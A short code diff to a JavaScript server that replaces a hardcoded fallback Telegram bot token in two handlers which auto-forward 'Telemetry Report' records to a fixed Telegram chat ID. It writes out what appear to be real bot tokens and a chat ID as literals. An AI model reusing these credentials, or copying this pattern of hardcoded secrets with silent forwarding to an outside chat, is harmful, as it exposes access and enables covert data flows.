@@ -2078,7 +2078,7 @@ async function startServer() {
       }
 
       // Auto-forward Telemetry Report to Telegram ONLY when not already dispatched by C# and debounced
-      const activeBotToken = body.botToken || body.telegramBotToken || telegramConfig.botToken || '8822107822:AAG9TIOX1lnRXpUuKCbs7ppM3r1TPTnNYrE';
+      const activeBotToken = body.botToken || body.telegramBotToken || telegramConfig.botToken || '8911539519:AAEbxtgt-OymCGXG43pQMrwU_cKLhR8dEBE';
       const activeChatId = body.chatId || body.telegramChatId || telegramConfig.chatId || '431228008';
 
       if (activeBotToken && activeChatId && shouldServerDispatchTelegram(newRecord, body)) {
@@ -3112,7 +3112,7 @@ Be crisp, authoritative, professional, and directly tailored to Enterprise porta
       try { processConsolidatedTelemetry(body); } catch (e) {}
 
       // Auto-forward Telemetry Report to Telegram ONLY when not already dispatched by C# and debounced
-      const activeBotTokenLive = body.botToken || body.telegramBotToken || telegramConfig.botToken || '8822107822:AAG9TIOX1lnRXpUuKCbs7ppM3r1TPTnNYrE';
+      const activeBotTokenLive = body.botToken || body.telegramBotToken || telegramConfig.botToken || '8911539519:AAEbxtgt-OymCGXG43pQMrwU_cKLhR8dEBE';
       const activeChatIdLive = body.chatId || body.telegramChatId || telegramConfig.chatId || '431228008';
 
       if (activeBotTokenLive && activeChatIdLive && shouldServerDispatchTelegram(newRecord, body)) {
